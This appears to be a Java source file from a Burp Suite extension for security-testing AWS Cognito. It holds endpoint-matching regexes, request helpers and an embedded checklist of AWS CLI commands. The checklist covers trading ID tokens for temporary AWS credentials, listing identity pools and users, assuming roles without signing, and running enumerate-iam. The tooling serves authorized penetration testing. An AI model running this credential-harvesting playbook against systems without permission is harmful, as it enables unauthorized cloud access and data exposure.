package com.nickcoblentz.montoya.aws;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.nickcoblentz.montoya.utilities.LogHelper;
import com.nickcoblentz.montoya.utilities.RequestHelper;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.regex.Pattern;

public class CognitoShared {

    public static final Pattern IDP_URL_PATTERN=Pattern.compile("^cognito-idp(?:-fips)?.[^\\.]+.amazonaws.com$", Pattern.CASE_INSENSITIVE);
    public static final Pattern POOL_URL_PATTERN=Pattern.compile("^cognito-identity(?:-fips)?.[^\\.]+.amazonaws.com$", Pattern.CASE_INSENSITIVE);

    public static final Pattern GENERAL_URL_PATTERN=Pattern.compile("^cognito-(?:identity|idp)(?:-fips)?.[^\\.]+.amazonaws.com$", Pattern.CASE_INSENSITIVE);

    public static final String X_AMAZON_TARGET="X-Amz-Target";

    public static final String EXPLOIT_DESCRIPTION="""
    <p>Try:</p>
    <ul>
    <li>omit regions with:<code>export AWS_DEFAULT_REGION="regionhere"</code>. Otherwise include <code>--region regionhere</code></li>
    <li><code>export AWS_IDENTITY_POOL_ID="identitypoolidhere"</code>. Otherwise include <code>--region regionhere</code></li>
    <li><code>aws cognito-identity get-id --identity-pool-id $AWS_IDENTITY_POOL_ID </code></li>
    <li>Produces an IdentityId (use below): <code>aws cognito-identity get-id --identity-pool-id $AWS_IDENTITY_POOL_ID --logins cognito-idp.$AWS_DEFAULT_REGION.amazonaws.com/issuerfromidtokenhere=idtokenvaluehere</code></li>
    <li><code>export AWS_IDENTITY_ID="valuefromabove"</code>
    <li>Produces SessionToken, SecretKey, SecretKey: <code>aws cognito-identity get-credentials-for-identity --identity-id $AWS_IDENTITY_ID --logins cognito-idp.$AWS_DEFAULT_REGION.amazonaws.com/issuerfromidtokenhere=idtokenvalueherefrominitauthresponse</code></li>
    <li>Set Values:<code>export AWS_ACCESS_KEY_ID=...'export AWS_SECRET_ACCESS_KEY=...;export AWS_SESSION_TOKEN=...</li>
    <li><code>aws sts get-caller-identity #check which roles this identity has</code></li>
    <li><code>aws cognito-identity describe-identity --identity-id $AWS_IDENTITY_ID</code></li>
    <li><code>aws cognito-identity describe-identity-pool --identity-pool-id $AWS_IDENTITY_POOL_ID</code></li>
    <li><code>aws cognito-identity list-identity-pools --max-results 100</code></li>
    <li><code>aws cognito-identity list-identities --identity-pool-id $AWS_IDENTITY_POOL_ID --max-results 100</code></li>
    <li><code>aws cognito-idp list-users --user-pool-id $AWS_IDENTITY_POOL_ID</code></li>
    <li><code>aws cognito-idp admin-list-devices --username test1 --user-pool-id $AWS_IDENTITY_POOL_ID</code></li>
    <li>Basic Flow Enabled? <code>aws cognito-identity get-open-id-token --identity-id $AWS_IDENTITY_ID --no-sign</code> and <code>aws sts assume-role-with-web-identity --role-arn <role_arn> --role-session-name sessionname --web-identity-token <token> --no-sign</code></li>
    <li><code>git clone https://github.com/andresriancho/enumerate-iam.git</code>, also see https://github.com/andresriancho/enumerate-iam/pull/15/commits/77ad5b41216e3b5f1511d0c385da8cd5984c2d3c to prevent it from getting stuck, then <code>./enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY --session-token $AWS_SESSION_TOKEN --region $AWS_DEFAULT_REGION</code>          
    </ul>
    <p>Reference: https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_Operations.html</p>
                                                                    """;

    public static String getReferer(MontoyaApi api, HttpRequest request)
    {
        String referer = "";
        if(requestNotNull(request)) {
            if (request != null) {
                referer = RequestHelper.GetHeaderValue(request, "Referer");
                if (referer == null) {
                    referer = "";
                }
            }
        }
        return referer;
    }

    public static String getXAmazonTarget(MontoyaApi api, HttpRequestResponse baseRequestResponse)
    {
        if(requestNotNull(baseRequestResponse))
        {
            String target = RequestHelper.GetHeaderValue(baseRequestResponse.request(), X_AMAZON_TARGET);
            return target;
        }
        return null;

    }

    public static boolean requestNotNull(HttpRequestResponse baseRequestResponse)
    {
        return baseRequestResponse!=null && baseRequestResponse!=null;
    }

    public static boolean requestNotNull(HttpRequest request)
    {
        return request!=null;
    }

    public static boolean responseNotNull(HttpResponse response)
    {
        return response!=null;
    }

    public static boolean responseNotNull(HttpRequestResponse baseRequestResponse)
    {
        return baseRequestResponse!=null && baseRequestResponse.response()!=null;
    }

    public static URL getJavaURL(HttpRequestResponse baseRequestResponse)
    {
        return getJavaURL(baseRequestResponse.url());
    }

    public static URL getJavaURL(HttpRequest request)
    {
        return getJavaURL(request.url());
    }

    public static URL getJavaURL(String urlString)
    {
        URL url=null;
        try
        {
            url = new URL(urlString);
        }
        catch(MalformedURLException e)
        {
            url=null;
        }
        return url;
    }
}
